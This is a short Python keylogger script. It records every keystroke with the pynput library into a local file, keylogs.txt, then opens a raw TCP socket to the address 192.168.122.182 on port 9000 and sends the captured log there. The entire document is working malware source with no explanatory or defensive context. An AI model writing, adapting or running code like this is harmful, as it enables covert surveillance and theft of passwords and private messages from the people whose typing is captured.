import os
from pynput import keyboard
import socket

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            f.write(str(key) + '\n')
    except Exception as e:
        print(f"Error writing to file: {e}")

def transmit_file():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('192.168.122.182', 9000))
            with open('keylogs.txt', 'rb') as f:
                data = f.read()
                s.sendall(data)
    except Exception as e:
        print(f"Error transmitting file: {e}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

transmit_file()